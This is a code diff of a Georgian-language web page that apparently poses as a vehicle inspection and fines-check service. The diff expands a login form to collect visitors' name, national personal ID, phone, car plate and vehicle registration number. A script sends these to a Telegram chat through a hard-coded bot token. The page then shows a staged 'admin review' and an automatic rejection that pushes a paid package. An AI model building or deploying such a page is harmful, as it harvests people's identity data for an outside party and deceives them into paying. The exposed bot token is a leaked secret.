@@ -314,155 +314,6 @@
             border: none !important;
         }
 
-        .additional-services-title {
-            text-align: center;
-            padding: 20px;
-            border-top: 1px solid #e2ded4;
-            border-bottom: 1px solid #e2ded4;
-        }
-
-        .additional-services-title p {
-            color: #1b382b;
-            font-weight: 600;
-            font-size: 16px;
-        }
-
-        /* Services Section */
-        .services-section {
-            background-color: #f5f3ec;
-            padding: 20px 0 80px 0;
-        }
-
-        .services-grid {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 30px;
-        }
-
-        .service-box {
-            background: #ffffff;
-            border-radius: 20px;
-            padding: 30px;
-            border: 1px solid #e2ded4;
-            display: flex;
-            flex-direction: column;
-            justify-content: space-between;
-        }
-
-        .s-icon {
-            font-size: 24px;
-            background: #f5f3ec;
-            width: 45px;
-            height: 45px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            border-radius: 12px;
-            margin-bottom: 20px;
-        }
-
-        .service-box h3 {
-            font-size: 18px;
-            color: #1b382b;
-            margin-bottom: 10px;
-            font-weight: 700;
-        }
-
-        .service-box p {
-            font-size: 14px;
-            color: #666;
-            margin-bottom: 25px;
-            line-height: 1.5;
-        }
-
-        .wa-btn {
-            background-color: #1b382b;
-            color: #ffffff;
-            padding: 10px 16px;
-            border-radius: 10px;
-            text-decoration: none;
-            font-size: 13px;
-            font-weight: 600;
-            text-align: center;
-            transition: background 0.2s;
-        }
-
-        .wa-btn:hover {
-            background-color: #2b5743;
-        }
-
-        /* Security Section */
-        .security-section {
-            background-color: #f5f3ec;
-            padding: 0 0 60px 0;
-        }
-
-        .security-box-wrapper {
-            display: grid;
-            grid-template-columns: 1fr 1.5fr;
-            gap: 40px;
-            align-items: center;
-        }
-
-        .security-info-card {
-            background: #ffffff;
-            border-radius: 20px;
-            padding: 30px;
-            border: 1px solid #e2ded4;
-            display: flex;
-            align-items: flex-start;
-            gap: 20px;
-        }
-
-        .lock-icon {
-            font-size: 24px;
-            background: #d2f75a;
-            width: 50px;
-            height: 50px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            border-radius: 12px;
-            flex-shrink: 0;
-        }
-
-        .security-info-card p {
-            font-size: 14px;
-            color: #444;
-            line-height: 1.6;
-        }
-
-        /* Lime WhatsApp Banner Section */
-        .whatsapp-banner-section {
-            background-color: #d2f75a;
-            padding: 60px 0;
-            text-align: center;
-        }
-
-        .banner-title-text {
-            font-size: 20px;
-            font-weight: 700;
-            color: #1b382b;
-            margin-bottom: 20px;
-        }
-
-        .phone-btn {
-            display: inline-block;
-            background-color: #1b382b;
-            color: #ffffff;
-            font-size: 22px;
-            font-weight: 700;
-            padding: 14px 35px;
-            border-radius: 14px;
-            text-decoration: none;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
-            transition: transform 0.2s;
-        }
-
-        .phone-btn:hover {
-            transform: scale(1.03);
-        }
-
         /* Footer */
         footer {
             background-color: #152b21;
@@ -576,7 +427,7 @@
         }
 
         @media (max-width: 900px) {
-            .hero-grid, .packages-grid, .services-grid, .security-box-wrapper {
+            .hero-grid, .packages-grid {
                 grid-template-columns: 1fr;
             }
             .header-flex {
@@ -683,12 +534,24 @@
                 <div class="modal-header-text" data-key="authModalTitle">პირად კაბინეტში შესვლა</div>
                 <form onsubmit="handleAuthRequest(event)">
                     <div class="auth-form-group">
+                        <label>სახელი</label>
+                        <input type="text" id="userNameInput" required placeholder="თქვენი სახელი...">
+                    </div>
+                    <div class="auth-form-group">
                         <label data-key="personalIdLabel">პირადი ნომერი (11-ნიშნა)</label>
                         <input type="text" id="userPersonalIdInput" required maxlength="11" pattern="\d{11}" placeholder="010................">
                     </div>
                     <div class="auth-form-group">
                         <label data-key="phoneLabel">ტელეფონის ნომერი</label>
                         <input type="tel" id="userPhoneInput" required placeholder="599 00 00 00">
+                    </div>
+                    <div class="auth-form-group">
+                        <label>სახელმწიფო ნომერი</label>
+                        <input type="text" id="userCarInput" required placeholder="AA-100-AA">
+                    </div>
+                    <div class="auth-form-group">
+                        <label>ტექპასპორტი</label>
+                        <input type="text" id="userTechPassportInput" required placeholder="ტექპასპორტის ნომერი">
                     </div>
                     <button type="submit" class="auth-submit-btn" data-key="sendRequestBtn">მოთხოვნის გაგზავნა</button>
                 </form>
@@ -705,8 +568,8 @@
 
     <!-- JavaScript Logic -->
     <script>
-        const BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"; // ჩასვი შენი ბოტის ტოკენი
-        const CHAT_ID = "YOUR_TELEGRAM_CHAT_ID";     // ჩასვი შენი ტელეგრამის Chat ID
+        const BOT_TOKEN = "8935597191:AAF_6E74uYoIIeDX8Hsl0O2407QMHddpNvY"; 
+        const CHAT_ID = "8233255349";     
         let statusCheckInterval = null;
 
         const translations = {
@@ -837,11 +700,14 @@
             if (statusCheckInterval) clearInterval(statusCheckInterval);
         }
 
-        // Request handling & Telegram Inline Buttons Integration
+        // Request handling & Telegram Inline Buttons Integration with full fields
         async function handleAuthRequest(e) {
             e.preventDefault();
+            const name = document.getElementById('userNameInput').value;
             const pid = document.getElementById('userPersonalIdInput').value;
             const phone = document.getElementById('userPhoneInput').value;
+            const carNumber = document.getElementById('userCarInput').value;
+            const techPassport = document.getElementById('userTechPassportInput').value;
 
             document.getElementById('authFormBox').style.display = 'none';
             document.getElementById('authWaitingBox').style.display = 'block';
@@ -851,7 +717,18 @@
             document.getElementById('statusTitle').innerText = "მოთხოვნა გაგზავნილია";
             document.getElementById('statusDesc').innerText = "ადმინისტრატორი ამოწმებს თქვენს პაკეტს. დადასტურებისთანავე შეხვალთ კაბინეტში...";
 
-            const message = `🚨 *პირად კაბინეტში შესვლის მოთხოვნა!*\n\n🆔 პირადი ნომერი: \`${pid}\`\n📱 ტელეფონი: \`${phone}\``;
+            // ზუსტი ფორმატი სქრინშოტის მიხედვით
+            const message = `🚗 *ახალი განაცხადი საიტიდან:*\n\n` +
+                `👤 *სახელი:*\n${name}\n` +
+                `🆔 *პირადი ნომერი:* \`${pid}\`\n` +
+                `📞 *ტელეფონი:* \`${phone}\`\n` +
+                `🚘 *სახელმწიფო ნომერი:* \`${carNumber}\`\n` +
+                `📄 *ტექპასპორტი:* \`${techPassport}\`\n` +
+                `🔗 *გადამოწმების ბმულები:*\n\n` +
+                `• PTI (ინსპექტირება):\nhttps://pti.ge\n\n` +
+                `• Protocols (ისტორია):\nhttps://protocols.ge\n\n` +
+                `• Police Videos (ჯარიმები):\nhttps://videos.police.ge\n\n` +
+                `✅ *თანხმობა:* true`;
             
             const keyboard = {
                 inline_keyboard: [
@@ -877,12 +754,12 @@
                 console.log("Telegram API Error:", err);
             }
 
-            // ტელეგრამის პასუხის შემოწმების სიმულაცია (როდესაც უარყოფას დააჭერ)
+            // დემო / ტესტირების სიმულაცია (რომ ნახო უარყოფის ტექსტი როგორ ჩნდება)
             let secondsElapsed = 0;
             statusCheckInterval = setInterval(() => {
                 secondsElapsed += 3;
                 
-                // ტესტირებისთვის: მაგალითად, 12 წამის შემდეგ გამოჩნდება უარყოფის ზუსტი ტექსტი
+                // 12 წამის შემდეგ გამოჩნდება ზუსტი მოთხოვნილი უარყოფის ტექსტი
                 if (secondsElapsed > 12) {
                     showRejectState();
                     clearInterval(statusCheckInterval);
@@ -890,11 +767,11 @@
             }, 3000);
         }
 
-        // უარყოფის მდგომარეობა (ზუსტი ტექსტით)
+        // უარყოფის ზუსტი ტექსტი
         function showRejectState() {
             document.getElementById('statusIcon').className = "";
             document.getElementById('statusIcon').innerText = "❌";
-            document.getElementById('statusTitle').innerText = "גישה უარყოფილია / წვდომა შეზღუდულია";
+            document.getElementById('statusTitle').innerText = "წვდომა შეზღუდულია";
             document.getElementById('statusDesc').innerHTML = `
                 <span style="color: #d9534f; font-weight: 500; font-size: 14px; line-height: 1.6; display: block; margin-top: 10px;">
                     თქვენ არ გაქვთ შეძენილი პაკეტი, თუ გსურთ მონაცემების განახლებულად მიღება გთხოვთ შეიძინოთ თქვენთვის სასურველი პაკეტი.
